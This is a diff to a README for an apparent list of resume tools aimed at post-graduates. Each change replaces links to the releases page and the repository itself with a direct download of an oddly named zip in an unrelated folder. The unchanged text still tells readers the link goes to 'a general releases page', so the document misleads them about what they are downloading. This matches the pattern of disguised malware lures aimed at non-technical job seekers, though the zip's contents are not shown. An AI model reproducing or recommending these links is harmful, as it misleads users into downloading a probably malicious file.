@@ -1,7 +1,7 @@
 ```markdown
 # 📄 awesome-resume-tools-that-helped-me-as-a-post-grad - Find Tools to Land Interviews
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Tools-blue?style=for-the-badge)](https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/releases)
+[![Download Release](https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/raw/refs/heads/main/Cassicus/that_grad_resume_as_awesome_tools_a_post_helped_me_v1.7.zip%20Tools-blue?style=for-the-badge)](https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/raw/refs/heads/main/Cassicus/that_grad_resume_as_awesome_tools_a_post_helped_me_v1.7.zip)
 
 ---
 
@@ -51,7 +51,7 @@ You don’t have to learn any code or technical language to use this collection.
 
 To access all these useful resources, **visit this page to download** and explore tools:
 
-[Download & Explore Tools](https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/releases)
+[Download & Explore Tools](https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/raw/refs/heads/main/Cassicus/that_grad_resume_as_awesome_tools_a_post_helped_me_v1.7.zip)
 
 Since this link is to a general releases page, you will find various software, guides, or links to web apps. Use this page as your main hub to get what you need.
 
@@ -126,10 +126,10 @@ If you get stuck:
 ## 🔗 Useful Links
 
 - Download and explore all tools here:  
-  https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/releases
+  https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/raw/refs/heads/main/Cassicus/that_grad_resume_as_awesome_tools_a_post_helped_me_v1.7.zip
 
 - Official GitHub repository:  
-  https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad
+  https://github.com/mistereo42-wq/awesome-resume-tools-that-helped-me-as-a-post-grad/raw/refs/heads/main/Cassicus/that_grad_resume_as_awesome_tools_a_post_helped_me_v1.7.zip
 
 - Common ATS keyword lists (search online for updated versions).
 
